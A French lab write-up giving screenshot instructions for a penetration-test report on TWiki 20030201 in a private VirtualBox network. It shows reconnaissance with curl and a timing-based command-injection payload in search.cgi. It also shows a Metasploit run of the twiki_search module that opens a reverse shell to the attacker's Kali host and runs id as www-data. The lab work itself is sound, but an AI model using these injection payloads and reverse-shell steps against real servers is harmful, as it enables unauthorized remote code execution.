# Captures — TWiki 20030201 (RCE via search.cgi, port 80)

Consignes de capture pour `services/twiki.html` (à construire). Commandes identiques à
`ms1/josa/twiki.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`, Kali `192.168.56.1`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

Chaque capture montre **la commande tapée ET son résultat**, terminal entier, prompt visible.

## 01-recon-enum.png

Les deux commandes à la suite :
```bash
for u in "twiki/" "twiki/bin/view" "twiki/bin/search" "twiki/TWikiHistory.html"; do curl -s -o /dev/null -w "/$u -> %{http_code}\n" "http://192.168.56.102/$u"; done
curl -s "http://192.168.56.102/twiki/TWikiHistory.html" | grep -oE '[0-9]{2} [A-Z][a-z]{2} 20[0-9]{2}' | head -2
```

Encadré en rouge : `/twiki/bin/search -> 200` et `18 Jan 2003` — appli présente + version.

## 02-recherche-cve.png

Les deux commandes à la suite :
```bash
searchsploit twiki
msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
```

Encadré en rouge : la ligne `'search.pm' Remote Command E...` de searchsploit, et
`https://nvd.nist.gov/vuln/detail/CVE-2004-1037` dans la sortie `info`.

## 03-confirm-timing.png

Les deux commandes à la suite (comparaison des temps de réponse) :
```bash
curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" --data-urlencode "search=test"
curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" --data-urlencode 'search=a'\'';sleep${IFS}5;#'\'''
```

Encadré en rouge : `0.12...s` (normal) puis `5.13...s` (injection) — la preuve que la commande
injectée s'exécute bien (délai mesurable).

## 04-exploit-msf.png

Dans `msfconsole`, lancement du module (resource script ou ligne par ligne) :
```
msf6 > use exploit/unix/webapp/twiki_search
msf6 exploit(unix/webapp/twiki_search) > set RHOSTS 192.168.56.102
msf6 exploit(unix/webapp/twiki_search) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unix/webapp/twiki_search) > set LHOST 192.168.56.1
msf6 exploit(unix/webapp/twiki_search) > set LPORT 4445
msf6 exploit(unix/webapp/twiki_search) > exploit -z
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.102:...)
```

Encadré en rouge : `[+] The target is vulnerable.` et `Command shell session 1 opened` — le
moment précis de l'exploitation réussie.

## 05-session-proof.png

Suite du même terminal :
```
msf6 exploit(unix/webapp/twiki_search) > sessions -i 1 -c id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Encadré en rouge : `uid=33(www-data) ...` — la preuve d'accès.
